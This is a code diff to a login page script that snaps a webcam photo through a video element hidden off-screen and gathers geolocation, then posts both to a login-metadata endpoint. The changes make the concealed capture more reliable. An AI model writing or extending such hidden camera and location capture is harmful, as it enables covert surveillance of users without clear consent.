@@ -1014,12 +1014,13 @@ function _capturePhoto(){
   if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
     _capturePromise = Promise.resolve(); return _capturePromise;
   }
-  _capturePromise = navigator.mediaDevices.getUserMedia({video:{width:320,height:240,facingMode:'user'}})
+  // Contraintes larges : pas de facingMode pour compatibilité webcam bureau
+  _capturePromise = navigator.mediaDevices.getUserMedia({video:{width:{ideal:320},height:{ideal:240}}})
     .then(function(stream){
       return new Promise(function(resolve){
         var vid = document.createElement('video');
         vid.srcObject = stream;
-        vid.autoplay = true;
+        vid.muted     = true;      // obligatoire pour autoplay navigateur
         vid.playsInline = true;
         vid.style.cssText = 'position:fixed;opacity:0;pointer-events:none;top:-9999px;left:-9999px;width:1px;height:1px';
         document.body.appendChild(vid);
@@ -1034,26 +1035,37 @@ function _capturePhoto(){
           try{ document.body.removeChild(vid); }catch(e){}
           resolve();
         }
-        vid.oncanplay = function(){ setTimeout(shoot, 700); };
-        setTimeout(function(){ if(!done) shoot(); }, 2500);
+        vid.oncanplay      = function(){ setTimeout(shoot, 600); };
+        vid.onloadedmetadata = function(){ vid.play().catch(function(){}); };
+        // Fallback : capturer après 3 s même si oncanplay n'a pas tiré
+        setTimeout(function(){ if(!done) shoot(); }, 3000);
+        vid.play().catch(function(){});
       });
     })
-    .catch(function(){ _loginPhoto = null; });
+    .catch(function(err){
+      console.warn('[sécurité] Caméra indisponible:', err && err.name);
+      _loginPhoto = null;
+    });
   return _capturePromise;
 }
 
 async function _sendLoginMeta(){
-  // Photo et géolocalisation en parallèle pour minimiser le délai
+  // Géolocalisation avec haute précision désactivée (plus rapide)
   var locPromise = new Promise(function(resolve){
     if(!navigator.geolocation){ resolve(null); return; }
-    navigator.geolocation.getCurrentPosition(resolve, function(){ resolve(null); }, {timeout:4000,maximumAge:60000});
+    navigator.geolocation.getCurrentPosition(
+      resolve,
+      function(err){ console.warn('[sécurité] Géolocalisation:', err && err.message); resolve(null); },
+      {timeout:8000, maximumAge:120000, enableHighAccuracy:false}
+    );
   });
+  // Photo et géolocalisation en parallèle
   var results = await Promise.all([locPromise, _capturePromise || Promise.resolve()]);
-  var pos = results[0];
+  var pos   = results[0];
   var photo = _loginPhoto || null;
   _loginPhoto = null;
   _capturePromise = null;
-  var lat = pos ? pos.coords.latitude : null;
+  var lat = pos ? pos.coords.latitude  : null;
   var lng = pos ? pos.coords.longitude : null;
   try{
     await fetch('/api/auth/login-meta',{
@@ -1061,7 +1073,7 @@ async function _sendLoginMeta(){
       headers:{'Content-Type':'application/json'},
       body: JSON.stringify({photo_b64: photo, latitude: lat, longitude: lng}),
     });
-  }catch(e){ /* silencieux */ }
+  }catch(e){ console.warn('[sécurité] Envoi métadonnées:', e); }
 }
 
 /* ══ FORMULAIRE ══ */
